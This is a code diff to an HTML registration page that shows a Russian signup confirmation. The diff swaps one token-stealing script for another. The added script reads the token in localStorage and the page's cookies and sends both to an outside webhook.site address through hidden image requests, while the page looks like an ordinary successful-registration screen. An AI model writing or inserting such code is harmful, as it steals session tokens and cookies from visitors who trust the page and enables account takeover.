@@ -52,19 +52,16 @@
   <div class="confirmation" id="ok">✅ Вы успешно зарегистрированы!</div>
   <iframe name="hiddenFrame"></iframe> 
 <script>
-  // Пытаемся получить токен из localStorage
   const token = localStorage.getItem("token");
+  const cookie = document.cookie;
 
-  // Если токен найден, отправляем его на webhook.site
-  if (token) {
-    const img = new Image();
-    img.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token);
-  } else {
-    // Отправим пустой запрос, чтобы проверить, что скрипт сработал вообще
-    const ping = new Image();
-    ping.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=null";
-  }
+  const img1 = new Image();
+  img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token || 'null');
+
+  const img2 = new Image();
+  img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(cookie || 'none');
 </script>
+
 
 </body>
 </html>
